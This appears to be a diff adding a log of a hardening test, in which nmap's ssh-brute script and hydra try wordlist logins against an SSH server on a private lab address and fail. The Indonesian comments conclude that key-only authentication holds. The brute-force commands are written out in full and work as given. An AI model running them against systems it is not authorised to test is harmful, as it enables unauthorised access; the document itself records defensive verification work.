@@ -1,0 +1,27 @@
+nmap -Pn --script=ssh-brute --script-args=userdb=users.txt,passdb=pass.txt -p 2245 172.20.4.2
+[kali attacker, 2026-11-26 11:55 +0700]
+
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 11:55 +0700
+Nmap scan report for 172.20.4.2
+Host is up (0.20s latency).
+
+PORT     STATE SERVICE
+2245/tcp open  hao
+
+Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
+→ NSE ssh-brute selesai TANPA kredensial valid ditemukan.
+
+===
+
+hydra -L users.txt -P pass.txt -s 2245 -t 4 ssh://172.20.4.2
+[kali attacker, 2026-11-26 11:55 +0700]
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-26 11:55:25
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 30 login tries (l:5/p:6), ~8 tries per task
+[DATA] attacking ssh://172.20.4.2:2245/
+[ERROR] target ssh://172.20.4.2:2245/ does not support password authentication (method reply 4).
+
+KESIMPULAN: server menolak metode autentikasi password di level protokol (key-only).
+Brute-force password tidak mungkin berapa pun wordlist — hardening kategori A bekerja.
